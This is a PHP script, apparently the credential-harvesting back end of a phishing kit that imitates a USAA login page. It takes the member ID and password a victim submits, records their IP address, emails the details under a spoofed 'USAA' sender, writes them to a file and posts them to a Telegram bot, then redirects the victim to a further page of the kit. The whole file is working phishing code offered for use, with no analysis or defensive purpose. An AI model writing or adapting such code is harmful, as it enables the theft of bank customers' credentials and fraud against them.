<?php

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "[+]🚀 USAA USER | New Login 🚀[+]\n";
$message .= "USERNAME : ".$_POST['memberId']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "Ip              : $ip\n";
$message .= "[+]🚀 USAA USER | New Login 🚀[+]\n";
$subject = "USAA Login | $ip ";
$headers = "From:USAA <itna1337@network.pickup.fr>";
mail($send,$subject,$message,$headers);
fwrite($text, $message);


file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

header("Location: ../info.php?id=m1yxpjJabdoZaD4OVaGzTZ9vaZafrf49587PTjsbedbXQ&_ga=2.165334463.1021036329.1648528336-393105297.1648295705&l=1");

include 'Telegram.php';

?>